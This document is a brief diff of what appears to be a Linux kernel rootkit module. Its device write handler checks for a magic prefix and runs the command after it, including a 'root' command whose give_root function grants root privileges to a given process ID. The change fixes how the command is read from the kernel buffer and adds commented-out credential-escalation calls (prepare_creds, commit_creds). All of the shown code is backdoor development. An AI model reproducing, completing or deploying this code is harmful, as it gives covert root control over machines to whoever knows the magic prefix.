@@ -132,7 +132,7 @@ static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_
 
 	/* if the string starts with the magic prefix, we try to execute the command */
 	if (memcmp(privBuf, magic, 3) == SUCCESS) {
-		cmdPtr = &buff[3];			// cmdPtr should now be the given command
+		cmdPtr = &privBuf[3];			// cmdPtr should now be the given command
 
 		/* case root access to a process- number after command indicates pid, 0 indicates itself */
 		if (strncmp(cmdPtr, "root", 4) == SUCCESS) {
@@ -190,6 +190,9 @@ static void give_root(int pid) {
 	struct task_struct *task;
 	if (pid == 0) {
 		task = current;
+		//struct cred *new = prepare_creds();
+		//root_creds(new);
+		//commit_creds(new);
 	} else {
 		task = find_task_from_pid(pid);
 		if (task == NULL) {
